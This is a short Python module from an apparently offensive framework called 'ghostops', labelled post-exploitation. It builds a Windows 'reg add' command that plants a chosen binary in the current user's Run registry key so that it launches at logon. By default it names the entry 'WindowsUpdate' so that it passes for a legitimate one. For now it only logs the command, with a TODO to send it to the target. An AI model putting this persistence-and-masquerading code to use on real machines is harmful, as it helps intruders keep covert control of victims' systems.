from ghostops.core.module_base import BaseModule
from colorama import Fore
import argparse
from ghostops.core.utils import Logger


class WindowsRegRunPersistence(BaseModule):
    module_name = "WindowsRegRunPersistence"
    module_description = (
        "Adds a binary to the Windows Registry Run key for persistence."
    )
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "postexp"
    module_target_os = ["windows"]
    module_target_architecture = ["x86", "x64"]

    @staticmethod
    def add_arguments(parser: argparse.ArgumentParser):
        # Add argument for full path to the binary to persist
        parser.add_argument(
            "--binary-path",
            required=True,
            help="Full path to the binary to persist (e.g., C:\\\\Users\\\\user\\\\AppData\\\\ghostops.exe)",
        )
        # Add argument for registry entry name with a default value
        parser.add_argument(
            "--entry-name",
            default="WindowsUpdate",
            help="Name of the registry entry (default: WindowsUpdate)",
        )

    @staticmethod
    def main(args):
        # Retrieve arguments from CLI input
        binary_path = args.binary_path
        entry_name = args.entry_name

        # Construct the Windows registry add command for persistence
        command = (
            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v "{entry_name}" /t REG_SZ /d "{binary_path}" /f'
        )

        # TODO: Implement sending this command to the target Windows system.
        # Currently printing the persistence command for development purposes.
        Logger.log("good", f"Persistence command: {command}")
